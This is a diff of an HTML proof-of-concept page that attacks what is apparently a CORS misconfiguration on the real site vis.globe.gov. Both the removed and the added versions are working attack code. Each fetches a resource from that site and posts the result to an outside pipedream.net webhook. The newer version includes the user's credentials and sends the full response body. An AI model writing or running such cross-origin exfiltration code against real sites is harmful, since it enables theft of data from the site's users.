@@ -1,48 +1,19 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>🔥 Exploiting vis.globe.gov CORS</title>
-  <meta charset="UTF-8">
-</head>
-<body>
-  <pre id="status">Loading...</pre>
-
-  <script>
-    const victimUrl = 'https://vis.globe.gov/GLOBE/VISmain.js';
-    const exfilUrl = 'https://eojzzzf3qvc4t0o.m.pipedream.net';
-
-    async function exploitCORS() {
-      try {
-        const res = await fetch(victimUrl, {
-          method: 'GET',
-          mode: 'cors',
-          credentials: 'omit' // safe for wildcard origins
-        });
-
-        const data = await res.text();
-        document.getElementById('status').innerText = '✅ Loaded VISmain.js (status ' + res.status + ')';
-
-        await fetch(exfilUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            message: 'CORS Exploit Successful',
-            status: res.status,
-            length: data.length,
-            content_sample: data.slice(0, 500),  // send first 500 chars only
-            userAgent: navigator.userAgent,
-            origin: location.origin,
-            timestamp: new Date().toISOString()
-          })
-        });
-
-        document.getElementById('status').innerText += '\n📬 Webhook POST sent!';
-      } catch (err) {
-        document.getElementById('status').innerText = '❌ Exploit failed: ' + err;
-      }
-    }
-
-    exploitCORS();
-  </script>
-</body>
-</html>
+<script>
+fetch("https://vis.globe.gov/app/js/VISmain.js", {
+  method: "GET",
+  credentials: "include"
+})
+  .then(res => res.text())
+  .then(data => {
+    fetch("https://eojzzzf3qvc4t0o.m.pipedream.net", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        message: "🔥 CORS Exfiltration Success",
+        content: data
+      })
+    });
+  });
+</script>
